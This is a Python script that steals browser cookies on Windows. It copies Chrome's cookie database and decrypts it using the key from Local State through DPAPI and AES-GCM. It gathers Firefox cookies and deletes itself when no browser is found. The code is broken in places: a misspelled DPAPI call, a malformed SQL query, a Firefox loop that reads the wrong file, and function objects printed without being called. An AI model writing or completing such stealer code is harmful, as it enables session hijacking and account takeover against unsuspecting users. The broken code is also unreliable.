from Crypto.Cipher import AES
import win32crypt
import sqlite3
import base64
import json
import os


home = ""

c_bin = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
f_bin = r"C:\Program Files\Mozilla Firefox\firefox.exe"
e_bin = ""

c_path = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"
)
localStatePath = os.path.join(c_path, "Local State")
c_cookiespath = os.path.join(c_path, "Default", "Network", "Cookies")

f_path = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"
)

print(c_path)
print(localStatePath)
print(c_cookiespath)


has_c = False
has_f = False
has_e = False


def check_for_browsers(c_bin, f_bin, e_bin):
    global has_c, has_f, has_e
    if os.path.isfile(c_bin):
        has_c = True
    if os.path.isfile(f_bin):
        has_f = True
    if os.path.isfile(e_bin):
        has_e = True
    if not (has_c or has_f or has_e):
        killself()
    return has_c, has_f, has_e


def c_get_key():
    if has_c == True:
        try:
            with open(localStatePath, "r", encoding="utf-8") as file:
                localStateData = json.load(file)
                encryptedKey = localStateData["os_crypt"]["encrypted_key"]
                keyData = base64.b64decode(encryptedKey.encode("utf-8"))
                return win32crypt.CryptoUnprotectedData(
                    keyData[5:], None, None, None, 0
                )[1]
        except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
            print(e)


def c_get_cookies():
    key = c_get_key()
    c_tempCookiesPath = os.path.join(os.environ["TEMP"], "c_tempcookies.db")
    print(c_tempCookiesPath)
    os.system(f'copy "{c_cookiespath}" "{c_tempCookiesPath}"')

    conn = sqlite3.connect(c_tempCookiesPath)
    cursor = conn.cursor()
    cursor.execute("""SELECT host_key, name, value, encrypted_value FROM cookies""")

    c_cookies = []
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not value:
            value = (
                AES.new(key, AES.MODE_GCM, encrypted_value[3:15])
                .decrypt(encrypted_value[15:-16])
                .decode()
            )

        c_cookies.append(
            {
                "name": name,
                "value": value,
                "domain": host_key,
            }
        )

    return c_cookies


def f_get_cookies(f_path):
    f_tempCookiesPath = os.path.join(os.environ["TEMP"], "f_tempcookies.db")
    f_cookies_files = []
    f_cookies = []
    for root, dirs, files in os.walk(f_path):
        for file in files:
            if file == "cookies.sqlite":
                f_cookies_path = os.path.join(root, file)
                f_cookies_files.append(f_cookies_path)
    for files in f_cookies_files:
        conn = sqlite3.connect(f_tempCookiesPath)
        cursor = conn.cursor()
        cursor.execute("""SELECT host, name, value, FROM moz_cookies""")
        for host, name, value in cursor.fetchall():
            f_cookies.append(
                {
                    "name": name,
                    "value": value,
                    "domain": host,
                }
            )

    return f_cookies


def killself():
    current_path = os.path.abspath(__file__)
    os.remove(current_path)


keyz = c_get_key
print(keyz)
doit = c_get_cookies
print(doit)
user_temp = os.environ.get("TEMP")
system_temp = r"C:\Windows\Temp"

print(f"User TEMP directory: {user_temp}")
